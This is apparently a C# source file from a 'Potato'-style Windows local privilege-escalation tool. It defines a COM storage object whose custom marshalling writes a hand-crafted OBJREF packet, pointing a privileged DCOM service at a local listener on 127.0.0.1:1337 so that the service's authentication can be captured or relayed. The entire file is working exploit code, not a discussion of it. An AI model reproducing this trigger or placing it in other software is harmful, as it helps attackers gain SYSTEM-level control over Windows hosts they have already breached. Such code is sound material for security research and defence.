using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualStudio.OLE.Interop;

namespace sharp_potato;

public class StorageTriggerOld : IMarshal, IStorage, ICustomQueryInterface
{
    private readonly IStorage storage;

    public StorageTriggerOld(IStorage storage)
    {
        this.storage = storage;
    }

    public void GetUnmarshalClass(ref Guid riid, IntPtr pv, uint dwDestContext, IntPtr pvDestContext, uint MSHLFLAGS, out Guid pCid)
    {
        pCid = Guid.Parse("00000306-0000-0000-c000-000000000046");
    }

    public void GetMarshalSizeMax(ref Guid riid, IntPtr pv, uint dwDestContext, IntPtr pvDestContext, uint MSHLFLAGS, out uint pSize)
    {
        pSize = 1024;
    }

    public void MarshalInterface(IStream pstm, ref Guid riid, IntPtr pv, uint dwDestContext, IntPtr pvDestContext, uint MSHLFLAGS)
    {
        var marshalBuffer = CompilePacket("1337", "127.0.0.1");
        pstm.Write(marshalBuffer, (uint) marshalBuffer.Length, out _);
    }

    public void UnmarshalInterface(IStream pstm, ref Guid riid, out IntPtr ppv)
    {
        ppv = IntPtr.Zero;
    }

    public void ReleaseMarshalData(IStream pstm)
    {
    }

    public void DisconnectObject(uint dwReserved)
    {
    }

    public void CreateStream(string pwcsName, uint grfMode, uint reserved1, uint reserved2, out IStream ppstm) =>
        storage.CreateStream(pwcsName, grfMode, reserved1, reserved2, out ppstm);

    public void OpenStream(string pwcsName, IntPtr reserved1, uint grfMode, uint reserved2, out IStream ppstm) =>
        storage.OpenStream(pwcsName, reserved1, grfMode, reserved2, out ppstm);

    public void CreateStorage(string pwcsName, uint grfMode, uint reserved1, uint reserved2, out IStorage ppstg) =>
        storage.CreateStorage(pwcsName, grfMode, reserved1, reserved2, out ppstg);

    public void OpenStorage(string pwcsName, IStorage pstgPriority, uint grfMode, IntPtr snbExclude, uint reserved, out IStorage ppstg) =>
        storage.OpenStorage(pwcsName, pstgPriority, grfMode, snbExclude, reserved, out ppstg);

    public void CopyTo(uint ciidExclude, Guid[] rgiidExclude, IntPtr snbExclude, IStorage pstgDest) =>
        storage.CopyTo(ciidExclude, rgiidExclude, snbExclude, pstgDest);

    public void MoveElementTo(string pwcsName, IStorage pstgDest, string pwcsNewName, uint grfFlags) =>
        storage.MoveElementTo(pwcsName, pstgDest, pwcsName, grfFlags);

    public void Commit(uint grfCommitFlags) => storage.Commit(grfCommitFlags);

    public void Revert()
    {
    }

    public void EnumElements(uint reserved1, IntPtr reserved2, uint reserved3, out IEnumSTATSTG ppEnum) =>
        storage.EnumElements(reserved1, reserved2, reserved3, out ppEnum);

    public void DestroyElement(string pwcsName) =>
        storage.DestroyElement(pwcsName);

    public void RenameElement(string pwcsOldName, string pwcsNewName) =>
        storage.RenameElement(pwcsOldName, pwcsNewName);

    public void SetElementTimes(string pwcsName, FILETIME[] pctime, FILETIME[] patime, FILETIME[] pmtime)
    {
    }

    public void SetClass(ref Guid clsid)
    {
    }

    public void SetStateBits(uint grfStateBits, uint grfMask)
    {
    }

    public void Stat(STATSTG[] pstatstg, uint grfStatFlag)
    {
        storage.Stat(pstatstg, grfStatFlag);

        // var bytes = Encoding.Unicode.GetBytes("hello.stg");
        // var ptrStr = Marshal.AllocCoTaskMem(bytes.Length);
        // Marshal.Copy(bytes, 0, ptrStr, bytes.Length);

        pstatstg[0].pwcsName = "hello.stg"; // ptrStr
    }

    public CustomQueryInterfaceResult GetInterface(ref Guid iid, out IntPtr ppv)
    {
        if (iid == Guid.Parse("0000000B-0000-0000-C000-000000000046"))
            ppv = Marshal.GetComInterfaceForObject(this, typeof(IStorage));
        if (iid == Guid.Parse("00000003-0000-0000-C000-000000000046"))
            ppv = Marshal.GetComInterfaceForObject(this, typeof(IMarshal));
        else
        {
            ppv = IntPtr.Zero;
            return CustomQueryInterfaceResult.Failed;
        }

        return CustomQueryInterfaceResult.Handled;
    }

    private static byte[] EncodeString(string str) => Encoding.Unicode.GetBytes('\0' + str)[1..^1];

    private static byte[] CompilePacket(string port, string address)
    {
        var stream = new MemoryStream();
        var writer = new BinaryWriter(stream);

        var headerBytes = new byte[]
        {
            0x4d, 0x45, 0x4f, 0x57, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x46, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0xcc, 0x96, 0xec, 0x06, 0x4a, 0xd8,
            0x03, 0x07, 0xac, 0x31, 0xce, 0x9c, 0x02, 0x9d, 0x53, 0x00, 0x9f, 0x93, 0x2c, 0x04, 0xcd, 0x54, 0xd4, 0xef, 0x4b,
            0xbd, 0x1c, 0x3b, 0xae, 0x97, 0x21, 0x45
        };

        var footerBytes = new byte[] {0x00, 0x5d, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0a, 0x00, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00};

        const short secLength = 8;
        int portLength = port.Length;
        int strPortLength = (address.Length + portLength + 2) * 2 + 6;
        int totalLength = (strPortLength + secLength) / 2;
        int secOffset = strPortLength / 2;
        portLength *= 2;

        writer.Write(headerBytes);
        writer.Write(new byte[] {(byte) totalLength, 0, (byte) secOffset, 0});
        writer.Write((byte) 0x07);
        writer.Write(EncodeString("127.0.0.1"));
        writer.Write(new byte[] {0x00, 0x5B});
        writer.Write(EncodeString("1337"));
        writer.Write(footerBytes);

        return stream.ToArray();
    }
}